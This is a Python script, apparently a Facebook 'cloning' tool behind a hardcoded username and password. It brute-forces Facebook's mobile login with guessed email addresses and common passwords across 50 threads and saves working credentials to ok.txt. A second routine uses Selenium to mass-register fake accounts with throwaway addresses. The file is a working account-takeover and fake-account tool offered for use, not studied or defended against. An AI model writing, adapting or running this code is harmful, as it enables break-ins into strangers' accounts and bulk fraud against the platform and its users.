import os, sys, time, random, re
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
except ImportError:
    os.system('pip install requests selenium webdriver-manager')
    os.execl(sys.executable, sys.executable, *sys.argv)

# --- LOGIN ---
def login():
    os.system('clear')
    print("\033[1;92m====================================")
    print("\033[1;93m      BASIT SYCO LIVE DASHBOARD")
    print("\033[1;92m====================================")
    user = input("\033[1;37m[+] Username: ")
    pas = input("\033[1;37m[+] Password: ")
    if user == "basitsultan" and pas == "basitprince":
        menu()
    else:
        print("\033[1;31mWrong Details!"); login()

# --- LIVE CRACKING LOGIC ---
def crack_engine(user, p_list):
    for pas in p_list:
        try:
            session = requests.Session()
            head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0'}
            res = session.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pas}, headers=head)
            
            if "c_user" in session.cookies.get_dict():
                print(f"\033[1;92m[SUCCESS] {user} | {pas} (Saved in ok.txt)")
                open('ok.txt', 'a').write(f"{user}|{pas}\n")
                return
            else:
                # Agar login nahi hua to red mein dikhaye
                print(f"\033[1;31m[FAILED]  {user} | {pas}")
        except:
            print(f"\033[1;31m[ERROR]   {user} | Connection Issue")

# --- UNIVERSAL CLONING ---
def universal_cloner():
    os.system('clear')
    print("\033[1;32m--- GLOBAL CLONING LIVE STATUS ---")
    keyword = input("Enter Name/Keyword: ")
    limit = int(input("How many IDs to check?: "))
    
    targets = []
    domains = ["@gmail.com", "@yahoo.com", "@mail7.io"]
    for _ in range(limit):
        targets.append(keyword + str(random.randint(10, 9999)) + random.choice(domains))

    print("\n\033[1;94m[*] Starting Live Cracking...\n")
    with ThreadPool(max_workers=50) as pool:
        for user in targets:
            # Common Global Passwords
            p_list = [keyword+"123", keyword+"786", "123456", "pakistan"]
            pool.submit(crack_engine, user, p_list)
    input("\n\033[1;92mProcess Done. Press Enter...")

# --- NEW ID CREATION (PC ONLY) ---
def auto_create():
    os.system('clear')
    print("\033[1;92m--- AUTO CREATION LIVE STATUS ---")
    num_ids = int(input("Total IDs to create?: "))
    user_pass = input("Fixed Password: ")
    
    try:
        options = webdriver.ChromeOptions()
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        
        for i in range(num_ids):
            f_name = random.choice(["John", "Alex", "Robert", "Emma"])
            email = f_name.lower() + str(random.randint(100,999)) + "@mail7.io"
            
            try:
                driver.get("https://m.facebook.com/reg/")
                time.sleep(4)
                driver.find_element(By.NAME, "firstname").send_keys(f_name)
                driver.find_element(By.NAME, "lastname").send_keys("Khan")
                driver.find_element(By.NAME, "reg_email__").send_keys(email)
                driver.find_element(By.NAME, "reg_passwd__").send_keys(user_pass)
                
                # Agar yahan tak process sahi hai to Green show kare
                print(f"\033[1;92m[CREATED] {email} | {user_pass}")
                open('created_ids.txt', 'a').write(f"{email}|{user_pass}\n")
                time.sleep(10) # Manual finish time
            except:
                print(f"\033[1;31m[FAILED]  {email} | Process Blocked")
        
        driver.quit()
    except Exception as e:
        print(f"\033[1;31m[ERROR] Selenium requires PC and Chrome! {e}")

def menu():
    os.system('clear')
    print("\033[1;32m   ____    _    ____ ___ _____ ")
    print("  | __ )  / \  / ___|_ _|_   _|")
    print("  |  _ \ / _ \ \___ \| |  | |  ")
    print("  | |_) / ___ \ ___) | |  | |  ")
    print("  |____/_/   \_\____/___| |_|  Live Tool")
    print("\n\033[1;37m[1] Start Universal Cloning (Live Status)")
    print("[2] Start Auto ID Creation (PC - Live Status)")
    print("[0] Exit")
    ch = input("\nSelect: ")
    if ch == '1': universal_cloner()
    elif ch == '2': auto_create()
    else: sys.exit()

if __name__ == "__main__":
    login()
